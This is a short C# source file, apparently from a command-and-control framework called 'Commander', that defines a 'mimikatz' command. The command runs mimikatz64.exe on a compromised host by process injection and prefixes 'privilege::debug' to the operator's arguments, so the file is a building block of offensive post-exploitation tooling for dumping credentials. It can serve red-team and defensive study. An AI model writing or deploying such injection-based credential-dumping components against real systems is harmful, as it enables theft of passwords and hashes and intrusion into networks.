using Commander.Communication;
using Commander.Executor;
using Commander.Terminal;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Commander.Commands.Inject
{
    public class MimikatzCommand : InjectCommand
    {
        public override string Description => "Run mimikatz on the host using process injection";
        public override string Name => "mimikatz";
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override string ExeName => "mimikatz64.exe";

        public override string ComputeParams(string innerParams)
        {
            return $"privilege::debug {innerParams} exit";
        }



    }
}
